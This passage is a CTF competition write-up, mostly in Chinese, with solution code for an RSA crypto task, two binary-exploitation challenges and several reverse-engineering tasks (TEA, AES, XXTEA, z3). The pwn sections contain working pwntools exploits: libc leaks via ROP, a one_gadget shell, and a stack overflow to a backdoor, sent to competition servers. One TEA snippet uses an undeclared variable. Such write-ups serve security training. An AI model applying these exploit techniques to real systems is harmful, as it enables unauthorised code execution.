0x01 Crypto
===========

**strange\_rsa1**
-----------------

```python
已知n,c,gift

用gift与n相乘开方得p，由此解

import gmpy2  
from Crypto.Util.number import \*  
import numpy as np  
​  
e = 65537  
n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413  
c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924  
gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938  
​  
p = 10354173078239628635626920146059887542108509101478542108107457141390325356890199583373894457500644181987484104714492532470944829664847264360542662124954077  
q = 10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369  
​  
L = (p-1)\*(q-1)  
d = gmpy2.invert(e,int(L))  
m = gmpy2.powmod(c,d,n)  
​  
x = long\_to\_bytes(m).decode()  
print(x)  
#flag{a5537b232c1ab750e0db61ec352504a301b7b212}
```

0x02 PWN
========

**note**
--------

edit的时候存在idx的负数溢出

发现idx = -4的时候可以写edit的返回地址，第一次泄露libc，第二次one gadget即可get shell

```python
from pwn import \*  
context(os = 'linux',arch = 'amd64',log\_level = 'debug')  
         
mode = 0  
if mode == 1:  
    fang = process("./note")    
else:  
    fang = remote("39.106.133.19",31828)  
​  
elf = ELF("./note")  
libc = ELF("./libc-2.31.so")  
​  
def debug():  
    gdb.attach(fang)  
    pause()  
​  
def alloc(size,cont):  
    fang.recvuntil("5. leave\\n")  
    fang.sendline(str(1))  
    fang.recvuntil("Size: ")  
    fang.sendline(str(size))  
    fang.recvuntil("Content: ")  
    fang.send(cont)  
​  
def dele(idx):  
    fang.recvuntil("5. leave\\n")  
    fang.sendline(str(4))  
    fang.recvuntil("Index: ")  
    fang.sendline(str(idx))  
​  
def show(idx):  
    fang.recvuntil("5. leave\\n")  
    fang.sendline(str(2))  
    fang.recvuntil("Index: ")  
    fang.sendline(str(idx))  
​  
def edit(idx,cont):  
    fang.recvuntil("5. leave\\n")  
    fang.sendline(str(3))  
    fang.recvuntil("Index: ")  
    fang.sendline(str(idx))  
    fang.recvuntil("Content: ")  
    fang.send(cont)  
​  
puts\_got = elf.got\['puts'\]  
puts\_plt = elf.plt\['puts'\]  
pop\_rdi\_ret = 0x00000000004017b3 # : pop rdi ; ret  
main\_addr = 0x401150  
​  
alloc(0x40,'aaaaaaaa') # 0  
alloc(0x40,'aaaaaaaa') # 1  
​  
\# gdb.attach(fang,'b \*0x401574')  
\# pause()  
​  
alloc(0x40,'aaaaaaaa') # 2  
​  
dele(1)  
​  
payload = b'a' \* 8 + p64(pop\_rdi\_ret) + p64(puts\_got) + p64(puts\_plt) + p64(main\_addr)  
edit(-4,payload)  
​  
puts\_addr = u64(fang.recv(6).ljust(8,b'\\x00'))  
libc\_base = puts\_addr - libc.symbols\['puts'\]  
system\_addr = libc\_base + libc.symbols\['system'\]  
bin\_sh\_addr = libc\_base + next(libc.search(b'/bin/sh'))  
one\_gadget3 = \[0xe3afe,0xe3b01,0xe3b04\]  
one\_gadget\_addr = libc\_base + one\_gadget3\[1\]  
pop\_rdx\_ret = libc\_base + 0x0000000000142c92 # : pop rdx ; ret  
alloc(0x50,'aaaaaaaa') # 0  
alloc(0x50,'aaaaaaaa') # 1  
alloc(0x50,'aaaaaaaa') # 2  
​  
\# gdb.attach(fang,'b \*0x401574')  
\# pause()  
​  
dele(1)  
payload  = b'a' \* 8  
payload += p64(pop\_rdx\_ret) + p64(0) + p64(one\_gadget\_addr) + p64(main\_addr)  
edit(-4,payload)  
​  
log.info("puts\_addr : 0x%x" % puts\_addr)  
log.info("libc\_base : 0x%x" % libc\_base)  
log.info("bin\_sh\_addr : 0x%x" % bin\_sh\_addr)  
​  
\# debug()  
​  
fang.interactive()  
'''  
0xe3afe execve("/bin/sh", r15, r12)  
constraints:  
  \[r15\] == NULL || r15 == NULL  
  \[r12\] == NULL || r12 == NULL  
​  
0xe3b01 execve("/bin/sh", r15, rdx)  
constraints:  
  \[r15\] == NULL || r15 == NULL  
  \[rdx\] == NULL || rdx == NULL  
​  
0xe3b04 execve("/bin/sh", rsi, rdx)  
constraints:  
  \[rsi\] == NULL || rsi == NULL  
  \[rdx\] == NULL || rdx == NULL  
'''
```

**捉迷藏**
-------

64位，只开了NX

存在后面函数，主函数main是根据输入等不同进行一堆判断之类的，“在垃圾里找宝藏”  
逆向发现main函数走分支进入1066行有一个对v341的读入，可以溢出写返回地址

```python
char v341; // \[rsp+471h\] \[rbp-Fh\] BYREF  
​  
input\_line((\_\_int64)&v341, 0x37uLL);  
​  
\_\_int64 \_\_fastcall input\_line(char \*a1, unsigned \_\_int64 a2)  
{  
    unsigned int i; // \[rsp+1Ch\] \[rbp-4h\]  
      
    for ( i = 0; a2 > (int)i; ++i )  
    a1\[i\] = getchar();  
    a1\[i\] = 0;  
    return i;  
}
```

Exp:

逆向题，最后写返回地址backdoor即可

```python
from pwn import \*  
context(os = 'linux',arch = 'amd64',log\_level = 'debug')  
         
mode = 0  
if mode == 1:  
    fang = process("./pwn")    
else:  
    fang = remote("39.106.27.2",31624)  
​  
def debug():  
    gdb.attach(fang)  
    pause()  
​  
\# gdb.attach(fang,'b \*0x4079D4')  
\# pause()  
​  
for i in range(3):  
    fang.sendline('1000 ')  
    sleep(0.01)  
​  
\# v4  
fang.sendline('1000 ')  
sleep(0.01)  
​  
for i in range(2):  
    fang.sendline('1000 ')  
    sleep(0.01)  
​  
\# v5  
fang.sendline('1000 ')  
sleep(0.01)  
​  
\# 第一个循环判断  
fang.sendline('1000 ')  
sleep(0.01)  
​  
\# 第二个循环判断  
fang.recvuntil("HuEqdjYtuWo:")  
payload = "JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe"  
fang.send(payload)  
​  
\# 第三个  
fang.recvuntil("hbsoMdIRWpYRqvfClb:")  
payload = "eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR"  
fang.send(payload)  
​  
\# 第四个  
payload = "wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO"  
fang.recvuntil("tfAxpqDQuTCyJw:")  
fang.send(payload)  
​  
\# 第五个  
fang.recvuntil("UTxqmFvmLy:")  
​  
for i in range(3):  
    fang.sendline('1000 ')  
    sleep(0.01)  
​  
\# v9  
fang.sendline('9255 ')  
\# v10  
fang.sendline('1 ')  
for i in range(3):  
    fang.send('1000 ')  
    sleep(0.01)  
​  
\# 第六个  
fang.recvuntil("LLQPyLAOGJbnm:")  
\# payload = "ujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM"  
\# my\_str = 'vkyH'  
​  
payload = "\\x3c\\x7f\\xfc\\xe2".ljust(0x2a,"\\x00")  
\# payload = "vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM"  
fang.send(payload)  
​  
\# 最后的栈溢出  
backdoor = 0x00000000040132C  
fang.recvuntil("gRGKqIlcuj:")  
payload = b'a' \* 0xf + b'b' \* 8 + p64(backdoor)  
payload = payload.ljust(0x37,b'\\x00')  
​  
fang.send(payload)  
​  
fang.interactive()
```

0x03 Reverse
============

**small**
---------

tea加密

```python
#include <stdio.h>  
#include <stdint.h>  
​  
//加密函数  
void encrypt(uint32\_t \*v, uint32\_t \*k)  
{  
    uint32\_t v0 = v\[0\], v1 = v\[1\], sum = 0, i;           /\* set up \*/  
    uint32\_t delta = 0x67452301;                         /\* a key schedule constant \*/  
    uint32\_t k0 = k\[0\], k1 = k\[1\], k2 = k\[2\], k3 = k\[3\]; /\* cache key \*/  
    for (i = 0; i < 32; i++)  
    { /\* basic cycle start \*/  
        sum += delta;  
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);  
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);  
    } /\* end cycle \*/  
    v\[0\] = v0;  
    v\[1\] = v1;  
}  
//解密函数  
void decrypt(uint32\_t \*v, uint32\_t \*k, int r)  
{  
    uint32\_t v0 = v\[0\], v1 = v\[1\], i;                     /\* set up \*/  
    uint32\_t delta = 0x67452301, sum = r \* 0x67452301; /\* a key schedule constant \*/  
    uint32\_t k0 = k\[0\], k1 = k\[1\], k2 = k\[2\], k3 = k\[3\];  /\* cache key \*/  
    for (i = 0; i < r; i++)  
    { /\* basic cycle start \*/  
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);  
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);  
        sum -= delta;  
    } /\* end cycle \*/  
    v\[0\] = v0;  
    v\[1\] = v1;  
}  
​  
int main()  
{  
    uint32\_t k\[4\] = {0x1, 0x23, 0x45, 0x67};  
​  
        uint32\_t v3\[\] = {0xDE087143, 0xC4F91BD2, 0xDAF6DADC, 0x6D9ED54C, 0x75EB4EE7, 0x5D1DDC04, 0x511B0FD9, 0x51DC88FB};  
​  
        for (int i = 0; i < 4; i++)  
        {  
            decrypt(v3 + i \* 2, k,r);  
            printf(" %08x %08x", v3\[2 \* i\], v3\[2 \* i + 1\]);  
        }  
​  
        puts("");  
      
    return 0;  
}
```

**static**
----------

真实逻辑是AES + Unicorn模拟

aes

```php
from multiprocessing.util import sub\_debug  
​  
​  
N\_ROUNDS = 10  
s\_box = (  
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,  
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,  
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,  
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,  
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,  
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,  
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,  
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,  
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,  
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,  
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,  
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,  
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,  
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,  
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,  
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,  
)  
inv\_s\_box = (  
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,  
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,  
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,  
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,  
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,  
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,  
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,  
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,  
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,  
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,  
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,  
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,  
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,  
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,  
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,  
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,  
)  
​  
def shift\_rows(s):  
    s\[0\]\[1\], s\[1\]\[1\], s\[2\]\[1\], s\[3\]\[1\] = s\[1\]\[1\], s\[2\]\[1\], s\[3\]\[1\], s\[0\]\[1\]  
    s\[0\]\[2\], s\[1\]\[2\], s\[2\]\[2\], s\[3\]\[2\] = s\[2\]\[2\], s\[3\]\[2\], s\[0\]\[2\], s\[1\]\[2\]  
    s\[0\]\[3\], s\[1\]\[3\], s\[2\]\[3\], s\[3\]\[3\] = s\[3\]\[3\], s\[0\]\[3\], s\[1\]\[3\], s\[2\]\[3\]  
​  
​  
def inv\_shift\_rows(s):  
    s\[1\]\[1\], s\[2\]\[1\], s\[3\]\[1\], s\[0\]\[1\] =s\[0\]\[1\], s\[1\]\[1\], s\[2\]\[1\], s\[3\]\[1\]  
    s\[2\]\[2\], s\[3\]\[2\], s\[0\]\[2\], s\[1\]\[2\] =s\[0\]\[2\], s\[1\]\[2\], s\[2\]\[2\], s\[3\]\[2\]  
    s\[3\]\[3\], s\[0\]\[3\], s\[1\]\[3\], s\[2\]\[3\] =s\[0\]\[3\], s\[1\]\[3\], s\[2\]\[3\], s\[3\]\[3\]  
​  
xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)  
def mix\_single\_column(a):  
    # see Sec 4.1.2 in The Design of Rijndael  
    t = a\[0\] ^ a\[1\] ^ a\[2\] ^ a\[3\]  
    u = a\[0\]  
    a\[0\] ^= t ^ xtime(a\[0\] ^ a\[1\])  
    a\[1\] ^= t ^ xtime(a\[1\] ^ a\[2\])  
    a\[2\] ^= t ^ xtime(a\[2\] ^ a\[3\])  
    a\[3\] ^= t ^ xtime(a\[3\] ^ u)  
​  
​  
def mix\_columns(s):  
    for i in range(4):  
        mix\_single\_column(s\[i\])  
​  
​  
def inv\_mix\_columns(s):  
    # see Sec 4.1.3 in The Design of Rijndael  
    for i in range(4):  
        u = xtime(xtime(s\[i\]\[0\] ^ s\[i\]\[2\]))  
        v = xtime(xtime(s\[i\]\[1\] ^ s\[i\]\[3\]))  
        s\[i\]\[0\] ^= u  
        s\[i\]\[1\] ^= v  
        s\[i\]\[2\] ^= u  
        s\[i\]\[3\] ^= v  
​  
    mix\_columns(s)  
​  
def bytes2matrix(text):  
    """ Converts a 16-byte array into a 4x4 matrix.  """  
    return \[list(text\[i:i+4\]) for i in range(0, len(text), 4)\]  
def matrix2bytes(m):  
    return bytes(sum(m,\[\]))  
​  
def add\_round\_key(s, k):  
    for i in range(4):  
        for j in range(4):  
            s\[i\]\[j\]^=k\[i\]\[j\]  
def inv\_sub(s):  
    for i in range(4):  
        for j in range(4):  
            s\[i\]\[j\] = inv\_s\_box\[s\[i\]\[j\]\]  
def sub(s):  
    for i in range(4):  
        for j in range(4):  
            s\[i\]\[j\] = s\_box\[s\[i\]\[j\]\]  
​  
def expand\_key(master\_key):  
    """  
    Expands and returns a list of key matrices for the given master\_key.  
    """  
    # Round constants https://en.wikipedia.org/wiki/AES\_key\_schedule#Round\_constants  
    r\_con = (  
        0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,  
        0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,  
        0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,  
        0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,  
    )  
    # Initialize round keys with raw key material.  
    key\_columns = bytes2matrix(master\_key)  
    iteration\_size = len(master\_key) // 4  
    # Each iteration has exactly as many columns as the key material.  
    columns\_per\_iteration = len(key\_columns)  
    i = 1  
    while len(key\_columns) < (N\_ROUNDS + 1) \* 4:  
        # Copy previous word.  
        word = list(key\_columns\[-1\])  
​  
        # Perform schedule\_core once every "row".  
        if len(key\_columns) % iteration\_size == 0:  
            # Circular shift.  
            word.append(word.pop(0))  
            # Map to S-BOX.  
            word = \[s\_box\[b\] for b in word\]  
            # XOR with first byte of R-CON, since the others bytes of R-CON are 0.  
            word\[0\] ^= r\_con\[i\]  
            i += 1  
        elif len(master\_key) == 32 and len(key\_columns) % iteration\_size == 4:  
            # Run word through S-box in the fourth iteration when using a  
            # 256-bit key.  
            word = \[s\_box\[b\] for b in word\]  
​  
        # XOR with equivalent word from previous iteration.  
        word = bytes(i^j for i, j in zip(word, key\_columns\[-iteration\_size\]))  
        key\_columns.append(word)  
​  
    # Group key words in 4x4 byte matrices.  
    return \[key\_columns\[4\*i : 4\*(i+1)\] for i in range(len(key\_columns) // 4)\]  
import numpy as np  
​  
def decrypt(key, ciphertext):  
    round\_keys = expand\_key(key) # Remember to start from the last round key and work backwards through them when decrypting  
    # Convert ciphertext to state matrix  
    round\_keys=\[  0x0B, 0x3A, 0xBA, 0x39, 0xA2, 0x64, 0x27, 0x1C, 0x36, 0x31,   
  0x98, 0x80, 0x9E, 0x77, 0x9E, 0xEB, 0xFF, 0x31, 0x53, 0x32,   
  0x5D, 0x55, 0x74, 0x2E, 0x6B, 0x64, 0xEC, 0xAE, 0xF5, 0x13,   
  0x72, 0x45, 0x80, 0x71, 0x3D, 0xD4, 0xDD, 0x24, 0x49, 0xFA,   
  0xB6, 0x40, 0xA5, 0x54, 0x43, 0x53, 0xD7, 0x11, 0x69, 0x7F,   
  0xBF, 0xCE, 0xB4, 0x5B, 0xF6, 0x34, 0x02, 0x1B, 0x53, 0x60,   
  0x41, 0x48, 0x84, 0x71, 0x33, 0x20, 0x1C, 0x4D, 0x87, 0x7B,   
  0xEA, 0x79, 0x85, 0x60, 0xB9, 0x19, 0xC4, 0x28, 0x3D, 0x68,   
  0x17, 0x07, 0x59, 0x51, 0x90, 0x7C, 0xB3, 0x28, 0x15, 0x1C,   
  0x0A, 0x31, 0xD1, 0x34, 0x37, 0x59, 0x2F, 0x9D, 0x92, 0x6F,   
  0xBF, 0xE1, 0x21, 0x47, 0xAA, 0xFD, 0x2B, 0x76, 0x7B, 0xC9,   
  0x1C, 0x2F, 0xB2, 0x01, 0x87, 0x4E, 0x0D, 0xE0, 0xA6, 0x09,   
  0xA7, 0x1D, 0x8D, 0x7F, 0xDC, 0xD4, 0x91, 0x50, 0x7A, 0x80,   
  0xD4, 0xC8, 0x77, 0x60, 0x72, 0xC1, 0xD0, 0x7D, 0xFF, 0xBE,   
  0x0C, 0xA9, 0x6E, 0xEE, 0xB2, 0x1F, 0xFC, 0x36, 0xC5, 0x7F,   
  0x8E, 0xF7, 0x15, 0x02, 0x71, 0x49, 0x19, 0xAB, 0x1F, 0xA7\] +  \[0xe6,0xdf,0xa0,0xe2,0x23,0xa0,0x2e,0x15,0x36,0xa2,0x5f,0x5c,0x2f,0x9,0x40,0xfb\]  
​  
    round\_keys = np.array(round\_keys).reshape(11,4,4)  
    Cipher\_matrix = bytes2matrix(ciphertext)  
    # Initial add round key step  
    add\_round\_key(Cipher\_matrix,round\_keys\[-1\])  
    for i in range(N\_ROUNDS - 1, 0, -1):  
        inv\_shift\_rows(Cipher\_matrix)  
        inv\_sub(Cipher\_matrix)  
        add\_round\_key(Cipher\_matrix,round\_keys\[i\])  
        inv\_mix\_columns(Cipher\_matrix)  
    # Run final round (skips the InvMixColumns step)  
    inv\_shift\_rows(Cipher\_matrix)  
    inv\_sub(Cipher\_matrix)  
    add\_round\_key(Cipher\_matrix,round\_keys\[0\])  
​  
    # Convert state matrix to plaintext  
    plaintext = matrix2bytes(Cipher\_matrix)  
    return plaintext  
​  
key        = b'\\xc3,\\\\\\xa6\\xb5\\x80^\\x0c\\xdb\\x8d\\xa5z\*\\xb6\\xfe\\\\'  
cipher = bytes.fromhex("AAFEE4E0C3B324164E5BF7139EE1CAA0")  
print(decrypt(key, cipher))  
​  
unicorn 是 逻辑运算 + XXTEA  
​  
#include <stdio.h>  
#include <stdint.h>  
#define DELTA 0xDEADBEEF            //固定的一个常量  
 char src\[16\];  
#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key\[(p&3)^e\] ^ z)))   //固定的运算  
void btea(uint32\_t \*v, int n, uint32\_t const key\[4\])   //v是要加密的两个元素的数组  
{                                                      //n为数组的长度  
    uint32\_t y, z;  
    uint32\_t sum;                                //无符号整型       
    unsigned p, rounds, e;                              
    if (n > 1)            /\* Coding Part \*/     
    {  
        rounds = 6 + 52/n;               //固定的得出轮数  
        sum = 0;                          
        z = v\[n-1\];                       
        do  
        {  
            sum += DELTA;                //每次进行叠加  
            e = (sum >> 2) & 3;          //固定运算  
            for (p=0; p<n-1; p++)         
            {  
                y = v\[p+1\];  
                v\[p\] += MX;  
                      z = v\[p\];       
                        }  
            y = v\[0\];  
            z = v\[n-1\] += MX;  
        }  
        while (--rounds);  
    }  
    else if (n < -1)      /\* Decoding Part \*/  
    {  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds\*DELTA;  
        y = v\[0\];  
        do  
        {  
            e = (sum >> 2) & 3;  
            for (p=n-1; p>0; p--)  
            {  
                z = v\[p-1\];  
                y = v\[p\] -= MX;  
            }  
            z = v\[n-1\];  
            y = v\[0\] -= MX;  
            sum -= DELTA;  
        }  
        while (--rounds);  
    }  
}  
​  
uint32\_t\* enc1(unsigned char\*buf)  
{  
​  
  src\[0\] = \*buf ^ buf\[5\] ^ (32 \* buf\[2\]) ^ (2 \* buf\[9\]) ^ (2 \* buf\[10\]);  
  src\[1\] = buf\[1\] ^ ((int)buf\[13\] >> 2) ^ ((int)buf\[12\] >> 2) ^ buf\[15\] ^ ((int)buf\[4\] >> 6);  
  src\[2\] = buf\[2\] ^ (buf\[1\] << 7) ^ ((int)buf\[15\] >> 6) ^ (8 \* buf\[14\]) ^ ((int)buf\[4\] >> 1);  
  src\[3\] = buf\[3\] ^ (2 \* buf\[10\]) ^ ((int)buf\[14\] >> 4) ^ ((int)buf\[6\] >> 4) ^ (32 \* buf\[13\]);  
  src\[4\] = buf\[4\] ^ (4 \* buf\[3\]) ^ buf\[10\] ^ (2 \* \*buf) ^ ((int)buf\[1\] >> 2);  
  src\[5\] = buf\[5\] ^ ((int)buf\[1\] >> 3) ^ (buf\[13\] << 7) ^ ((int)buf\[2\] >> 7) ^ (4 \* buf\[8\]);  
  src\[6\] = buf\[6\] ^ ((int)buf\[8\] >> 7) ^ (4 \* buf\[5\]) ^ (16 \* buf\[3\]) ^ ((int)buf\[14\] >> 3);  
  src\[7\] = buf\[7\] ^ ((int)buf\[11\] >> 6) ^ ((int)buf\[2\] >> 5) ^ (buf\[3\] << 6) ^ (2 \* buf\[1\]);  
  src\[8\] = buf\[8\] ^ (buf\[11\] << 7) ^ ((int)buf\[5\] >> 6) ^ (2 \* buf\[4\]) ^ (16 \* buf\[6\]);  
  src\[9\] = buf\[9\] ^ (8 \* buf\[15\]) ^ ((int)buf\[4\] >> 3) ^ (32 \* buf\[12\]) ^ buf\[2\];  
  src\[10\] = buf\[10\] ^ ((int)\*buf >> 2) ^ (2 \* buf\[9\]) ^ (buf\[5\] << 7) ^ ((int)buf\[11\] >> 7);  
  src\[11\] = buf\[11\] ^ buf\[5\] ^ ((int)buf\[10\] >> 4) ^ ((int)buf\[6\] >> 6) ^ ((int)buf\[3\] >> 6);  
  src\[12\] = buf\[12\] ^ (buf\[4\] << 6) ^ ((int)buf\[2\] >> 1) ^ ((int)buf\[15\] >> 1) ^ (buf\[11\] << 7);  
  src\[13\] = buf\[13\] ^ ((int)buf\[6\] >> 3) ^ ((int)buf\[9\] >> 7) ^ (32 \* buf\[1\]) ^ ((int)buf\[11\] >> 7);  
  src\[14\] = buf\[14\] ^ (buf\[7\] << 7) ^ (16 \* buf\[9\]) ^ ((int)buf\[8\] >> 1) ^ (16 \* buf\[2\]);  
  src\[15\] = buf\[15\] ^ ((int)\*buf >> 1) ^ ((int)buf\[13\] >> 6) ^ (4 \* buf\[7\]) ^ ((int)buf\[11\] >> 5);  
  return (uint32\_t\*)src;  
}  
​  
​  
​  
int main()  
{   uint32\_t  v\[4\] = {0xE0E4FEAA, 0x1624B3C3, 0x13F75B4E, 0xA0CAE19E};  
​  
    uint32\_t y\[4\] = { 0xFB732728, 0x4D26D4BB, 0xDA122E3A, 0x26BAFC68};  
​  
    uint32\_t const k\[4\]= {12,34,56,78};  
​  
​  
    btea(v, -4, k);  
    printf("v解密后的数据：%08x %08x %08x %08x", v\[0\], v\[1\], v\[2\], v\[3\]);  
    puts("");  
    btea(y, -4, k);  
    printf("y解密后的数据：%08x %08x %08x %08x", y\[0\], y\[1\], y\[2\], y\[3\]);  
​  
    return 0;  
}  
z3 约束求解  
​  
def enc1(buf):  
    src = \[0\]\*16  
    src\[0\] = buf\[0\] ^ buf\[5\] ^ (32 \* buf\[2\]) ^ (2 \* buf\[9\]) ^ (2 \* buf\[10\])  
    src\[1\] = buf\[1\] ^ (buf\[13\] >> 2) ^ (buf\[12\] >> 2) ^ buf\[15\] ^ (buf\[4\] >> 6)  
    src\[2\] = buf\[2\] ^ (buf\[1\] << 7) ^ (buf\[15\] >> 6) ^ (8 \* buf\[14\]) ^ (buf\[4\] >> 1)  
    src\[3\] = buf\[3\] ^ (2 \* buf\[10\]) ^ (buf\[14\] >> 4) ^ (buf\[6\] >> 4) ^ (32 \* buf\[13\])  
    src\[4\] = buf\[4\] ^ (4 \* buf\[3\]) ^ buf\[10\] ^ (2 \* buf\[0\]) ^ (buf\[1\] >> 2)  
    src\[5\] = buf\[5\] ^ (buf\[1\] >> 3) ^ (buf\[13\] << 7) ^ (buf\[2\] >> 7) ^ (4 \* buf\[8\])  
    src\[6\] = buf\[6\] ^ (buf\[8\] >> 7) ^ (4 \* buf\[5\]) ^ (16 \* buf\[3\]) ^ (buf\[14\] >> 3)  
    src\[7\] = buf\[7\] ^ (buf\[11\] >> 6) ^ (buf\[2\] >> 5) ^ (buf\[3\] << 6) ^ (2 \* buf\[1\])  
    src\[8\] = buf\[8\] ^ (buf\[11\] << 7) ^ (buf\[5\] >> 6) ^ (2 \* buf\[4\]) ^ (16 \* buf\[6\])  
